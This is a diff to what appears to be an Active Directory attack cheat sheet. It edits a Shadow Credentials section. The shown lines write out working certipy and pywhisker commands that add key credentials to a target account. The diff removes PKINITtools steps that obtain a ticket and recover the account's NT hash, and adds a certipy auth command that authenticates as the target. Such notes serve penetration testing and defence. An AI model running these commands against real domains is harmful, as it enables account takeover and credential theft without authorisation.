@@ -440,9 +440,8 @@ certipy shadow auto -u attacker@domain.local -p pass -account <target_user> -dc-
 
 # pywhisker — alternative tool
 python3 pywhisker.py -d domain.local -u attacker -p pass --target <target_user> --action add
-# Then use PKINITtools:
-python3 gettgtpkinit.py -cert-pem cert.pem -key-pem priv.pem domain.local/<target_user> target.ccache
-python3 getnthash.py -key <session_key> domain.local/<target_user>
+# Then auth with certipy:
+certipy auth -pfx <target_user>.pfx -dc-ip <dc> -username <target_user> -domain domain.local
 ```
 
 ### MSSQL lateral movement
